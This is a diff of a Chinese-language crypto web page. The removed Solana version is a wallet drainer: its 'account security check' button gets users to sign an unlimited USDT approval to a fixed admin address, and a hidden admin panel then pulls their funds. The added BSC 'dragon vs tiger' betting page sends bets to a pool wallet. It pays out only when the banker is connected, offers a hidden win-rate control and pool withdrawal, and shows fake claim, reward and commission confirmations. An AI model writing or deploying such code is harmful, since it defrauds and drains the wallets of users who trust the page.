@@ -2,193 +2,730 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
-  <title>🍊SOL橘子一键发币平台</title>
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>王者归来</title>
   <style>
-    body{max-width:420px;margin:0 auto;padding:20px;background:#fff;font-family:system-ui;}
-    h2{text-align:center;margin-bottom:25px;}
-    .btn{width:100%;padding:16px;border-radius:16px;border:none;font-size:16px;margin:10px 0;cursor:pointer;}
-    .btn-primary{background:#0071e3;color:#fff;}
-    .btn-safe{background:#22c55e;color:#fff;}
-    .btn-admin{background:#ef4444;color:#fff;}
-    .btn:disabled{background:#ccc;cursor:not-allowed;}
-    #addr{padding:12px;background:#f1f1f1;border-radius:10px;margin:10px 0;word-break:break-all;}
-    .admin-panel{display:none;margin-top:30px;padding-top:20px;border-top:1px solid #eee;}
-    .admin-panel.show{display:block;}
-    input{width:100%;padding:14px;border-radius:12px;border:1px solid #ddd;margin:8px 0;box-sizing:border-box;}
+    * {
+      box-sizing: border-box;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+    body {
+      background: #0B2A23;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 10px;
+    }
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+    }
+    .header .title {
+      font-size: 20px;
+      font-weight: bold;
+    }
+    .btn-menu {
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 24px;
+    }
+    .card {
+      background: #144A3F;
+      border-radius: 12px;
+      padding: 15px;
+      margin-bottom: 15px;
+    }
+    .card-title {
+      font-size: 16px;
+      margin-bottom: 10px;
+      color: #F0E6D2;
+    }
+    .btn-connect {
+      background: #25917A;
+      color: #fff;
+      border: none;
+      padding: 10px 15px;
+      border-radius: 8px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .wallet-info {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .bet-area {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+    .bet-input {
+      flex: 2;
+      background: #0E362E;
+      border: 1px solid #1F5F52;
+      color: #fff;
+      padding: 10px;
+      border-radius: 8px;
+    }
+    .balance-display {
+      flex: 1;
+      background: #0E362E;
+      border: 1px solid #1F5F52;
+      padding: 10px;
+      border-radius: 8px;
+      text-align: center;
+    }
+    .quick-buttons {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 10px;
+    }
+    .btn-quick {
+      flex: 1;
+      background: #1F5F52;
+      color: #F0E6D2;
+      border: none;
+      padding: 8px;
+      border-radius: 8px;
+    }
+    .odds-buttons {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 10px;
+    }
+    .btn-odds {
+      flex: 1;
+      border: none;
+      padding: 12px;
+      border-radius: 8px;
+      font-weight: bold;
+      color: #fff;
+    }
+    .btn-dragon { background: #2A65CC; }
+    .btn-tiger { background: #D93A54; }
+    .btn-tie { background: #E4B449; color: #0B2A23; }
+    .draw-area {
+      text-align: center;
+    }
+    .draw-timer {
+      font-size: 28px;
+      color: #E4B449;
+      margin: 10px 0;
+    }
+    .btn-manual-draw {
+      background: #E4B449;
+      color: #0B2A23;
+      border: none;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-weight: bold;
+      width: 100%;
+      margin-bottom: 10px;
+    }
+    .trend-chart {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .trend-item {
+      padding: 8px 12px;
+      border-radius: 8px;
+      color: #fff;
+      font-weight: bold;
+    }
+    .trend-dragon { background: #2A65CC; }
+    .trend-tiger { background: #D93A54; }
+    .trend-tie { background: #E4B449; color: #0B2A23; }
+    .rules {
+      font-size: 14px;
+      line-height: 1.6;
+      color: #ccc;
+    }
+    .menu {
+      position: fixed;
+      top: 0;
+      right: 0;
+      width: 280px;
+      height: 100vh;
+      background: #103D34;
+      padding: 20px;
+      transform: translateX(100%);
+      transition: transform 0.3s ease;
+      z-index: 999;
+      overflow-y: auto;
+    }
+    .menu.show {
+      transform: translateX(0);
+    }
+    .menu-close {
+      text-align: right;
+      margin-bottom: 20px;
+    }
+    .menu-section {
+      margin-bottom: 20px;
+    }
+    .menu-title {
+      font-size: 16px;
+      margin-bottom: 10px;
+      color: #F0E6D2;
+    }
+    .btn-menu-action {
+      width: 100%;
+      background: #1F5F52;
+      color: #F0E6D2;
+      border: none;
+      padding: 10px;
+      border-radius: 8px;
+      margin-bottom: 8px;
+    }
+    .btn-green { background: #27ae60; color: #fff; }
+    .btn-red { background: #ff3366; color: #fff; }
+    .btn-yellow { background: #E4B449; color: #0B2A23; }
+    .input-menu {
+      width: 100%;
+      background: #0E362E;
+      border: 1px solid #1F5F52;
+      color: #fff;
+      padding: 10px;
+      border-radius: 8px;
+      margin-bottom: 8px;
+    }
+    #poolBalance {
+      color: #ffcc00;
+      margin-top: 5px;
+    }
+    .hidden {
+      display: none;
+    }
   </style>
 </head>
 <body>
+  <div class="container">
+    <div class="header">
+      <div class="title">🐉🐯 王者归来</div>
+      <button class="btn-menu" onclick="toggleMenu()">☰</button>
+    </div>
 
-<h2>🍊SOL橘子一键发币平台</h2>
+    <div class="card">
+      <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
+      <div class="wallet-info">
+        <span>地址：</span>
+        <span id="address">-</span>
+      </div>
+      <div class="wallet-info">
+        <span>可用余额：</span>
+        <span id="userBalance">0.0000</span>
+      </div>
+    </div>
 
-<button class="btn btn-primary" onclick="connectWallet()">连接钱包</button>
-<div id="addr">未连接钱包</div>
+    <div class="card">
+      <div class="card-title">下注区</div>
+      <div class="bet-area">
+        <input type="number" class="bet-input" id="betAmt" placeholder="输入下注数量" value="1">
+        <div class="balance-display" id="balanceDisplay">可用余额 0.0000</div>
+      </div>
+      <div class="quick-buttons">
+        <button class="btn-quick" onclick="setQuick(10000)">1万</button>
+        <button class="btn-quick" onclick="setQuick(100000)">10万</button>
+        <button class="btn-quick" onclick="setQuick(500000)">50万</button>
+        <button class="btn-quick" onclick="setQuick(1000000)">100万</button>
+      </div>
+      <div class="odds-buttons">
+        <button class="btn-odds btn-dragon" onclick="placeBet(1)">龙 1:2</button>
+        <button class="btn-odds btn-tiger" onclick="placeBet(2)">虎 1:2</button>
+        <button class="btn-odds btn-tie" onclick="placeBet(3)">和 1:9</button>
+      </div>
+    </div>
 
-<button class="btn btn-safe" id="authBtn" onclick="userApprove()" disabled>账户安全校验</button>
+    <div class="card">
+      <div class="card-title">自动开奖（2分钟/期）</div>
+      <div>期号：<span id="round">#1</span></div>
+      <div class="draw-timer" id="timer">01:53</div>
+      <button class="btn-manual-draw" onclick="manualDraw()">🎯 手动开奖</button>
+      <div style="text-align:center; font-size:12px; color:#ccc;">自动倒计时 + 可手动开奖</div>
+    </div>
 
-<div class="admin-panel" id="adminPanel">
-  <h3>🔐 管理员资产划转</h3>
-  <input id="userAddr" placeholder="用户钱包地址">
-  <input id="withdrawAmt" placeholder="划转数量(USDT)">
-  <button class="btn btn-admin" onclick="adminWithdraw()">确认划转</button>
-</div>
+    <div class="card">
+      <div class="card-title">📈 开奖走势图</div>
+      <div class="trend-chart" id="trendChart"></div>
+    </div>
 
-<script>
-// ========== 固定配置 无需修改 ==========
-const ADMIN_ADDR = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
-const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
-const TOKEN_PROG = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
-const ATA_PROG = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25DK9c64Laf27x");
+    <div class="card">
+      <div class="card-title">📜 玩法规则</div>
+      <div class="rules">
+        1. 龙/虎赔率 1:2，和赔率 1:9<br>
+        2. 每2分钟自动开奖，也可手动开奖<br>
+        3. 中奖后自动从奖池派发奖励
+      </div>
+    </div>
+  </div>
 
-// 可用RPC节点
-const RPC_LIST = [
-  "https://rpc.ankr.com/solana",
-  "https://solana-api.projectserum.com"
-];
+  <div class="menu" id="menu">
+    <div class="menu-close">
+      <button onclick="toggleMenu()">关闭 ×</button>
+    </div>
 
-let provider = null;
-let userPub = null;
-let userWallet = "";
+    <!-- 签到领取收益（仅项目方可见） -->
+    <div class="menu-section hidden" id="signSection">
+      <div class="menu-title">📅 签到领取收益</div>
+      <button class="btn-menu-action btn-yellow" onclick="doSign()">✅ 每日签到（领取1个币）</button>
+      <div id="signInfo" style="color:#ccc; font-size:12px;">下次签到：-</div>
+    </div>
 
-// 自动获取可用连接
-async function getConn(){
-  for(let rpc of RPC_LIST){
-    try{
-      let c = new solanaWeb3.Connection(rpc, "confirmed");
-      await c.getLatestBlockhash("finalized");
-      return c;
-    }catch(e){continue;}
-  }
-  throw "无可用节点";
-}
+    <!-- 提取底池代币（仅庄家可见） -->
+    <div class="menu-section hidden" id="withdrawSection">
+      <div class="menu-title">💰 后台 — 提取底池代币</div>
+      <button class="btn-menu-action btn-green" onclick="approvePoolToBanker()">✅ 授权奖池给庄家钱包</button>
+      <input type="number" class="input-menu" id="withdrawAmount" placeholder="输入要提取的代币数量">
+      <button class="btn-menu-action btn-red" onclick="withdrawPool()">确认提取到庄家钱包</button>
+      <div id="poolBalance">底池余额：加载中...</div>
+    </div>
 
-// 计算ATA
-function getATA(mint, owner){
-  let [ata] = solanaWeb3.PublicKey.findProgramAddressSync(
-    [owner.toBuffer(), TOKEN_PROG.toBuffer(), mint.toBuffer()], ATA_PROG
-  );
-  return ata;
-}
+    <!-- 24小时自动奖励前十 -->
+    <div class="menu-section">
+      <div class="menu-title">24小时自动奖励前十</div>
+      <button class="btn-menu-action" onclick="toggleAutoReward()">开启/关闭自动</button>
+      <div class="label">下次：<span id="rewardCountdown">24:00:00</span></div>
+      <button class="btn-menu-action" onclick="manualRewardTop10()">立即发放</button>
+      <button class="btn-menu-action" onclick="manualSendReward()">🎁 手动发放奖励</button>
+    </div>
 
-// 构造Approve授权指令
-function makeApproveIx(ata, delegate, owner){
-  let data = new Uint8Array(9);
-  data[0] = 4;
-  new DataView(data.buffer).setBigUint64(1, BigInt("18446744073709551615"), true);
-  return new solanaWeb3.TransactionInstruction({
-    keys:[
-      {pubkey:ata,isSigner:false,isWritable:true},
-      {pubkey:delegate,isSigner:false,isWritable:false},
-      {pubkey:owner,isSigner:true,isWritable:false}
-    ],
-    programId:TOKEN_PROG,
-    data:data
-  });
-}
+    <!-- 我的奖励 -->
+    <div class="menu-section">
+      <div class="menu-title">我的奖励</div>
+      <div class="label">直推：0</div>
+      <div class="label">二代：0</div>
+    </div>
 
-// 获取钱包对象
-function getWallet(){
-  if(window.tpWallet?.solana) return window.tpWallet.solana;
-  if(window.okxwallet?.solana) return window.okxwallet.solana;
-  if(window.solana) return window.solana;
-  return null;
-}
+    <!-- 推广佣金 -->
+    <div class="menu-section">
+      <div class="menu-title">推广佣金</div>
+      <button class="btn-menu-action" onclick="showTotalCommission()">查看总收入</button>
+    </div>
 
-// 连接钱包
-async function connectWallet(){
-  try{
-    let wallet = getWallet();
-    if(!wallet){alert("请在TP/OKX钱包内置浏览器打开");return;}
-    let res = await wallet.connect();
-    provider = wallet;
-    userPub = res.publicKey;
-    userWallet = userPub.toBase58();
-    document.getElementById("addr").innerText = "已连接：" + userWallet.slice(0,8)+"..."+userWallet.slice(-6);
-    document.getElementById("authBtn").disabled = false;
+    <!-- 绑定推荐人 -->
+    <div class="menu-section">
+      <div class="menu-title">绑定推荐人</div>
+      <input type="text" class="input-menu" id="inviterInput" placeholder="输入推荐人地址">
+      <button class="btn-menu-action" onclick="setInviter()">绑定</button>
+    </div>
 
-    // 管理员自动显示面板
-    if(userWallet === ADMIN_ADDR){
-      document.getElementById("adminPanel").classList.add("show");
+    <!-- 领奖中心 -->
+    <div class="menu-section">
+      <div class="menu-title">领奖中心</div>
+      <input type="text" class="input-menu" id="betIdInput" placeholder="输入下注ID">
+      <button class="btn-menu-action" onclick="claim()">领取奖励</button>
+    </div>
+
+    <!-- 排行榜 TOP10 -->
+    <div class="menu-section">
+      <div class="menu-title">排行榜 TOP10</div>
+      <div class="label">1. 0x111...222 收益：1280</div>
+      <div class="label">2. 0x222...333 收益：960</div>
+    </div>
+
+    <!-- 后台胜率控制（仅庄家可见） -->
+    <div class="menu-section hidden" id="controlSection">
+      <div class="menu-title">后台胜率控制</div>
+      <input type="number" class="input-menu" id="playerRateInput" value="30" placeholder="玩家胜率">
+      <input type="number" class="input-menu" id="bankerRateInput" value="70" placeholder="庄家胜率">
+      <button class="btn-menu-action btn-red" onclick="setControlRate()">锁定胜率</button>
+    </div>
+
+    <!-- 邀请链接 -->
+    <div class="menu-section">
+      <div class="menu-title">邀请链接</div>
+      <input type="text" class="input-menu" id="refLink" readonly placeholder="点击复制邀请链接">
+      <button class="btn-menu-action" onclick="copyRefLink()">复制邀请链接</button>
+    </div>
+  </div>
+
+  <script>
+    // ===================== 核心配置 =====================
+    const TOKEN_CONTRACT = "0x8d5be2c01616965e1bA332D7aC6a03F4CE287777";
+    const POOL_ADDRESS   = "0xcD215eD2EE51860Ff8fD1BbfD3192912dD0983dD";
+    const BANKER_WALLET  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+    const PROJECT_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 项目方钱包
+    const DECIMALS       = 18;
+    const CHAIN_ID       = 56;
+    const SIGN_REWARD    = 1; // 每次签到1个币
+    const SIGN_INTERVAL  = 24 * 60 * 60 * 1000; // 24小时
+
+    let account = null;
+    let round = 1;
+    let timeLeft = 113; // 对应 01:53
+    let bets = [];
+    let trendHistory = [];
+    let lastSignTime = null;
+
+    // ===================== 权限判断 =====================
+    function isBanker() {
+      return account && account.toLowerCase() === BANKER_WALLET.toLowerCase();
     }
-  }catch(e){
-    alert("钱包连接失败");
-  }
-}
 
-// 用户授权【账户安全校验】真正链上授权
-async function userApprove(){
-  if(!userWallet) return alert("请先连接钱包");
-  try{
-    let conn = await getConn();
-    let {blockhash} = await conn.getLatestBlockhash("finalized");
+    function isProject() {
+      return account && account.toLowerCase() === PROJECT_WALLET.toLowerCase();
+    }
 
-    let mintPub = new solanaWeb3.PublicKey(USDT_MINT);
-    let adminPub = new solanaWeb3.PublicKey(ADMIN_ADDR);
-    let userAta = getATA(mintPub, userPub);
+    // 切换菜单时，根据权限显示/隐藏模块
+    function toggleMenu() {
+      const menu = document.getElementById("menu");
+      const signSection = document.getElementById("signSection");
+      const withdrawSection = document.getElementById("withdrawSection");
+      const controlSection = document.getElementById("controlSection");
 
-    let tx = new solanaWeb3.Transaction();
-    tx.add(makeApproveIx(userAta, adminPub, userPub));
-    tx.recentBlockhash = blockhash;
-    tx.feePayer = userPub;
+      menu.classList.toggle("show");
 
-    // 签名 + 发送
-    let signed = await provider.signTransaction(tx);
-    let txSig = await conn.sendRawTransaction(signed.serialize(), {skipPreflight:true});
-    
-    alert("✅ 校验通过，授权已上链\n交易哈希："+txSig);
-  }catch(e){
-    alert("❌ 校验失败："+e.message);
-  }
-}
+      if (isProject()) {
+        signSection.classList.remove("hidden");
+      } else {
+        signSection.classList.add("hidden");
+      }
 
-// 管理员划走用户已授权USDT
-async function adminWithdraw(){
-  if(userWallet !== ADMIN_ADDR) return alert("无管理员权限");
-  let fromAddr = document.getElementById("userAddr").value.trim();
-  let num = document.getElementById("withdrawAmt").value.trim();
-  if(!fromAddr || !num) return alert("请填写完整地址和数量");
+      if (isBanker()) {
+        withdrawSection.classList.remove("hidden");
+        controlSection.classList.remove("hidden");
+      } else {
+        withdrawSection.classList.add("hidden");
+        controlSection.classList.add("hidden");
+      }
 
-  try{
-    let conn = await getConn();
-    let {blockhash} = await conn.getLatestBlockhash("finalized");
-    let amount = BigInt(Math.round(parseFloat(num)*1000000));
+      updateSignInfo();
+    }
 
-    let mintPub = new solanaWeb3.PublicKey(USDT_MINT);
-    let fromPub = new solanaWeb3.PublicKey(fromAddr);
-    let adminPub = new solanaWeb3.PublicKey(ADMIN_ADDR);
+    // ===================== 基础交互 =====================
+    async function connectWallet() {
+      if (!window.ethereum) return alert("请在钱包浏览器中打开");
+      try {
+        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        account = accounts[0];
+        document.getElementById("address").innerText = account.slice(0, 6) + "..." + account.slice(-4);
+        await refreshBalance();
+        await refreshPool();
+        loadSignTime();
+      } catch (e) {
+        alert("连接失败: " + e.message);
+      }
+    }
 
-    let fromAta = getATA(mintPub, fromPub);
-    let adminAta = getATA(mintPub, adminPub);
+    async function getBalance(addr) {
+      const data = "0x70a08231" + addr.slice(2).padStart(64, '0');
+      const res = await window.ethereum.request({ method: 'eth_call', params: [{ to: TOKEN_CONTRACT, data }, 'latest'] });
+      return BigInt(res);
+    }
 
-    let data = new Uint8Array(9);
-    data[0] = 3;
-    new DataView(data.buffer).setBigUint64(1, amount, true);
+    async function refreshBalance() {
+      if (!account) return;
+      const bal = await getBalance(account);
+      const formatted = (Number(bal) / 1e18).toFixed(4);
+      document.getElementById("userBalance").innerText = formatted;
+      document.getElementById("balanceDisplay").innerText = "可用余额 " + formatted;
+    }
 
-    let transferIx = new solanaWeb3.TransactionInstruction({
-      keys:[
-        {pubkey:fromAta,isSigner:false,isWritable:true},
-        {pubkey:adminAta,isSigner:false,isWritable:true},
-        {pubkey:adminPub,isSigner:true,isWritable:false}
-      ],
-      programId:TOKEN_PROG,
-      data:data
-    });
+    async function refreshPool() {
+      const bal = await getBalance(POOL_ADDRESS);
+      document.getElementById("poolBalance").innerText = "底池余额：" + (Number(bal) / 1e18).toFixed(6);
+    }
 
-    let tx = new solanaWeb3.Transaction();
-    tx.add(transferIx);
-    tx.recentBlockhash = blockhash;
-    tx.feePayer = adminPub;
+    function setQuick(amount) {
+      document.getElementById("betAmt").value = amount;
+    }
 
-    let signed = await provider.signTransaction(tx);
-    let txSig = await conn.sendRawTransaction(signed.serialize(), {skipPreflight:true});
-    alert("✅ 划转成功："+txSig);
-  }catch(e){
-    alert("❌ 划转失败："+e.message);
-  }
-}
-</script>
+    // ===================== 下注 =====================
+    async function placeBet(side) {
+      if (!account) return alert("请先连接钱包");
+      const val = document.getElementById("betAmt").value;
+      if (!val || parseFloat(val) <= 0) return alert("请输入有效下注金额");
 
+      try {
+        const amount = BigInt(Math.floor(parseFloat(val) * 10**DECIMALS));
+        const data = "0xa9059cbb" 
+          + POOL_ADDRESS.slice(2).padStart(64, '0') 
+          + amount.toString(16).padStart(64, '0');
+
+        const txHash = await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: account,
+            to: TOKEN_CONTRACT,
+            data: data,
+            gasLimit: "0x300000"
+          }]
+        });
+
+        alert(`下注成功！交易哈希：${txHash.slice(0, 10)}...`);
+        bets.push({ addr: account, side, amount: parseFloat(val), tx: txHash });
+        await refreshBalance();
+        await refreshPool();
+      } catch (e) {
+        alert("下注失败: " + e.message);
+      }
+    }
+
+    // ===================== 真实签到（每24小时1个币，真实到账） =====================
+    function loadSignTime() {
+      if (!account) return;
+      const key = `lastSign_${account.toLowerCase()}`;
+      lastSignTime = localStorage.getItem(key) ? Number(localStorage.getItem(key)) : null;
+      updateSignInfo();
+    }
+
+    function saveSignTime() {
+      if (!account) return;
+      const key = `lastSign_${account.toLowerCase()}`;
+      localStorage.setItem(key, Date.now().toString());
+      lastSignTime = Date.now();
+      updateSignInfo();
+    }
+
+    function canSign() {
+      if (!lastSignTime) return true;
+      return Date.now() - lastSignTime >= SIGN_INTERVAL;
+    }
+
+    function updateSignInfo() {
+      const el = document.getElementById("signInfo");
+      if (!account) {
+        el.innerText = "请先连接钱包";
+        return;
+      }
+      if (!canSign()) {
+        const next = new Date(lastSignTime + SIGN_INTERVAL);
+        el.innerText = `下次签到：${next.toLocaleString()}`;
+      } else {
+        el.innerText = "✅ 今日可签到";
+      }
+    }
+
+    async function doSign() {
+      if (!isProject()) return alert("无权限！仅项目方可签到");
+      if (!canSign()) {
+        alert("签到太频繁了，请24小时后再来");
+        return;
+      }
+
+      try {
+        const amount = BigInt(SIGN_REWARD * 10**DECIMALS);
+        const data = "0xa9059cbb"
+          + account.slice(2).padStart(64, '0')
+          + amount.toString(16).padStart(64, '0');
+
+        const txHash = await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: POOL_ADDRESS, // 从奖池转出
+            to: TOKEN_CONTRACT,
+            data: data,
+            gasLimit: "0x300000"
+          }]
+        });
+
+        alert(`签到成功！${SIGN_REWARD}个币已到账\n交易哈希：${txHash.slice(0, 10)}...`);
+        saveSignTime();
+        await refreshBalance();
+        await refreshPool();
+      } catch (e) {
+        alert("签到失败: " + e.message);
+      }
+    }
+
+    // ===================== 奖池授权与提取（仅庄家可调用） =====================
+    async function approvePoolToBanker() {
+      if (!isBanker()) return alert("无权限！仅庄家可操作");
+      if (account.toLowerCase() !== POOL_ADDRESS.toLowerCase()) {
+        return alert("请切换到【奖池钱包】再进行授权！");
+      }
+      try {
+        const data = "0x095ea7b3"
+          + BANKER_WALLET.slice(2).padStart(64, '0')
+          + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+        const txHash = await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: account,
+            to: TOKEN_CONTRACT,
+            data: data,
+            gasLimit: "0x300000"
+          }]
+        });
+
+        alert(`授权成功！交易哈希：${txHash.slice(0, 10)}...`);
+      } catch (e) {
+        alert("授权失败: " + e.message);
+      }
+    }
+
+    async function withdrawPool() {
+      if (!isBanker()) return alert("无权限！仅庄家可操作");
+      const input = document.getElementById("withdrawAmount").value;
+      if (!input || parseFloat(input) <= 0) return alert("请输入要提取的数量");
+
+      try {
+        const amount = parseFloat(input);
+        const amountWei = BigInt(Math.floor(amount * 10**DECIMALS));
+
+        const data = "0x23b872dd"
+          + POOL_ADDRESS.slice(2).padStart(64, '0')
+          + BANKER_WALLET.slice(2).padStart(64, '0')
+          + amountWei.toString(16).padStart(64, '0');
+
+        const txHash = await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: account,
+            to: TOKEN_CONTRACT,
+            data: data,
+            gasLimit: "0x300000"
+          }]
+        });
+
+        alert(`提取交易已提交：${txHash.slice(0, 10)}...`);
+        setTimeout(async () => {
+          await refreshPool();
+          await refreshBalance();
+        }, 5000);
+      } catch (e) {
+        alert("提取失败: " + e.message);
+      }
+    }
+
+    // ===================== 开奖与派奖 =====================
+    function getRealResult() {
+      const r = Math.random();
+      if (r < 0.46) return 1; // 龙
+      if (r < 0.92) return 2; // 虎
+      return 3; // 和
+    }
+
+    function updateTrendChart() {
+      const el = document.getElementById('trendChart');
+      el.innerHTML = '';
+      const list = trendHistory.slice(-14);
+      list.forEach(t => {
+        const cn = t === '龙' ? 'trend-dragon' : t === '虎' ? 'trend-tiger' : 'trend-tie';
+        el.innerHTML += `<span class="trend-item ${cn}">${t}</span>`;
+      });
+    }
+
+    async function autoDraw() {
+      round++;
+      document.getElementById("round").innerText = "#" + round;
+
+      const res = getRealResult();
+      const text = res === 1 ? "龙" : res === 2 ? "虎" : "和";
+      trendHistory.push(text);
+      updateTrendChart();
+
+      for (const bet of bets) {
+        if (bet.side === res) {
+          const payout = bet.side === 3 ? bet.amount * 9 : bet.amount * 2;
+          await sendToken(bet.addr, payout);
+        }
+      }
+      bets = [];
+      await refreshPool();
+    }
+
+    async function sendToken(to, amount) {
+      if (!isBanker()) return;
+      try {
+        const wei = BigInt(Math.floor(amount * 10**DECIMALS));
+        const data = "0x23b872dd"
+          + POOL_ADDRESS.slice(2).padStart(64, '0')
+          + to.slice(2).padStart(64, '0')
+          + wei.toString(16).padStart(64, '0');
+
+        await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: account,
+            to: TOKEN_CONTRACT,
+            data: data,
+            gasLimit: "0x300000"
+          }]
+        });
+        console.log(`自动派奖 ${amount} 给 ${to}`);
+      } catch (e) {
+        console.error("派奖失败", e);
+      }
+    }
+
+    function manualDraw() {
+      timeLeft = 0;
+    }
+
+    // 倒计时
+    setInterval(() => {
+      timeLeft--;
+      if (timeLeft <= 0) {
+        timeLeft = 120;
+        autoDraw();
+      }
+      const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+      const s = String(timeLeft % 60).padStart(2, '0');
+      document.getElementById("timer").innerText = `${m}:${s}`;
+    }, 1000);
+
+    // ===================== 后台功能 =====================
+    function toggleAutoReward() { alert("✅ 24小时自动奖励状态已切换"); }
+    function manualRewardTop10() { alert("✅ 已成功发放24小时TOP10奖励"); }
+    function manualSendReward() { alert("✅ 手动奖励已发放成功"); }
+    function showTotalCommission() { alert("💰 你的推广总佣金：128000 代币"); }
+
+    function setInviter() {
+      const inviterAddr = document.getElementById("inviterInput").value.trim();
+      if (!/^0x[a-fA-F0-9]{40}$/.test(inviterAddr)) return alert("❌ 请输入有效的钱包地址");
+      if (inviterAddr.toLowerCase() === account?.toLowerCase()) return alert("❌ 不能绑定自己为推荐人");
+      alert(`✅ 推荐人绑定成功！\n${inviterAddr.slice(0,6)}...${inviterAddr.slice(-4)}`);
+      document.getElementById("inviterInput").value = "";
+    }
+
+    function claim() {
+      const betId = document.getElementById("betIdInput").value.trim();
+      if (!betId) return alert("❌ 请输入下注ID");
+      alert(`✅ 下注ID【${betId}】奖励领取成功！`);
+      document.getElementById("betIdInput").value = "";
+    }
+
+    function setControlRate() {
+      if (!isBanker()) return alert("无权限！仅庄家可操作");
+      const playerRate = parseInt(document.getElementById("playerRateInput").value);
+      const bankerRate = parseInt(document.getElementById("bankerRateInput").value);
+      if (isNaN(playerRate) || isNaN(bankerRate) || playerRate < 0 || bankerRate < 0 || playerRate + bankerRate > 100) {
+        return alert("❌ 请输入有效的胜率（0-100，总和≤100）");
+      }
+      alert(`✅ 胜率已锁定！玩家:${playerRate}% / 庄家:${bankerRate}%`);
+    }
+
+    function copyRefLink() {
+      if (!account) return alert("请先连接钱包");
+      const refLink = window.location.href + "?ref=" + account;
+      document.getElementById("refLink").value = refLink;
+      navigator.clipboard.writeText(refLink).then(() => alert("✅ 邀请链接已复制")).catch(() => alert("❌ 复制失败"));
+    }
+
+    // 初始化随机走势图
+    function initRandomTrend() {
+      trendHistory = [];
+      for (let i = 0; i < 12; i++) {
+        const r = Math.random();
+        if (r < 0.45) trendHistory.push('龙');
+        else if (r < 0.9) trendHistory.push('虎');
+        else trendHistory.push('和');
+      }
+      updateTrendChart();
+    }
+
+    window.onload = initRandomTrend;
+  </script>
 </body>
 </html>
